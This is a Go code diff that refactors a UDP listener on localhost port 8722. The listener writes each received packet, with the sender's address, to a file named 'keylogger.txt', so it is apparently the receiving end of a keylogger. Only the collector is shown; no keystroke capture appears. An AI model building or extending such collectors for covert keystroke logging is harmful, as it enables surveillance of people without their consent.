@@ -14,35 +14,49 @@ import (
 const (
 	Protocol = "udp"
 	Address  = "127.0.0.1:8722"
+
 	Filename = "keylogger.txt"
+
+	ExitResolveUDPAddr = iota + 1
+	ExitListenUDP
+	ExitOpenFile
 )
 
-func main() {
+var (
+	conn *net.UDPConn
+	file *os.File
+)
+
+func init() {
+	var err error
 	laddr, err := net.ResolveUDPAddr(Protocol, Address)
 	if err != nil {
 		fmt.Printf("Failed to resolve UDP address: %s\n", err.Error())
-		return
+		os.Exit(ExitResolveUDPAddr)
 	}
-	conn, err := net.ListenUDP(Protocol, laddr)
+	conn, err = net.ListenUDP(Protocol, laddr)
 	if err != nil {
 		fmt.Printf("Failed to listen UDP: %s\n", err.Error())
-		return
+		os.Exit(ExitListenUDP)
 	}
-	defer conn.Close()
+	file, err = os.OpenFile(Filename, os.O_WRONLY|os.O_CREATE|os.O_APPEND, os.ModePerm)
+	if err != nil {
+		defer conn.Close()
+		fmt.Printf("Failed to open file: %s\n", err.Error())
+		os.Exit(ExitOpenFile)
+	}
+}
 
-	fmt.Println("Start listening...")
+func main() {
+	defer conn.Close()
+	defer file.Close()
+	fmt.Print("Start listening...")
 	fromHead := true
 	for {
 		buffer := make([]byte, 1024)
-		n, raddr, e := conn.ReadFromUDP(buffer)
-		if e != nil {
-			fmt.Printf("Failed to read from UDP: %s\n", e.Error())
-			continue
-		}
-		file, e := os.OpenFile(Filename, os.O_WRONLY|os.O_CREATE|os.O_APPEND, os.ModePerm)
-		if e != nil {
-			fmt.Printf("Failed to open file: %s\n", e.Error())
-			fmt.Printf("[%s] %s\n", raddr, bufString(buffer[:n]))
+		n, raddr, err := conn.ReadFromUDP(buffer)
+		if err != nil {
+			fmt.Printf("Failed to read from UDP: %s\n", err.Error())
 			continue
 		}
 		if len(bufString(buffer[:n])) == 1 {
@@ -58,7 +72,6 @@ func main() {
 			}
 			_, _ = file.WriteString(fmt.Sprintf("[%s] %s\n", raddr, bufString(buffer[:n])))
 		}
-		_ = file.Close()
 	}
 }
 
